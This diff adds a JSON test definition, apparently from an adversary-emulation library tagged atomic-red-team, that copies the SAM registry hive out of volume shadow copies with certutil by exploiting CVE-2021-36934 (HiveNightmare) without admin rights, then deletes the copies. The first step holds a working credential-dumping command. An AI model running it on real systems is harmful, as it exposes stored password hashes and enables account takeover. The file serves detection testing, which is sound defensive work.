@@ -1,0 +1,58 @@
+{
+  "id": "eeb9751a-d598-42d3-b11c-c122d9c3f6c7",
+  "name": "dump volume shadow copy hives with certutil",
+  "description": "Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as \"HiveNightmare\" or \"SeriousSAM\".\nThis can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "78c3b945-8d79-453d-9f07-d7a5a8043b13",
+      "type": "execute-command",
+      "data": {
+        "command": "for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%a\\Windows\\System32\\config\\#{target_hive}\" %temp%\\#{target_hive}vss%a 2 \u003enul 2\u003e\u00261) \u0026 dir /B %temp%\\#{target_hive}vss*\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "9bb61c70-cf4f-43ee-8b40-a2313cedaad8",
+      "type": "execute-command",
+      "data": {
+        "command": "for /L %a in (1,1,#{limit}) do @(del %temp%\\#{target_hive}vss%a \u003enul 2\u003e\u00261)\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "78c3b945-8d79-453d-9f07-d7a5a8043b13",
+      "p": "on-success",
+      "o": "9bb61c70-cf4f-43ee-8b40-a2313cedaad8"
+    },
+    {
+      "s": "78c3b945-8d79-453d-9f07-d7a5a8043b13",
+      "p": "on-failure",
+      "o": "9bb61c70-cf4f-43ee-8b40-a2313cedaad8"
+    }
+  ],
+  "tags": [
+    "T1003.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "target_hive",
+      "type": "string",
+      "description": "Hive you wish to dump",
+      "value": "SAM"
+    },
+    {
+      "name": "limit",
+      "type": "integer",
+      "description": "Limit to the number of shadow copies to iterate through when trying to copy the hive",
+      "value": "10"
+    }
+  ]
+}
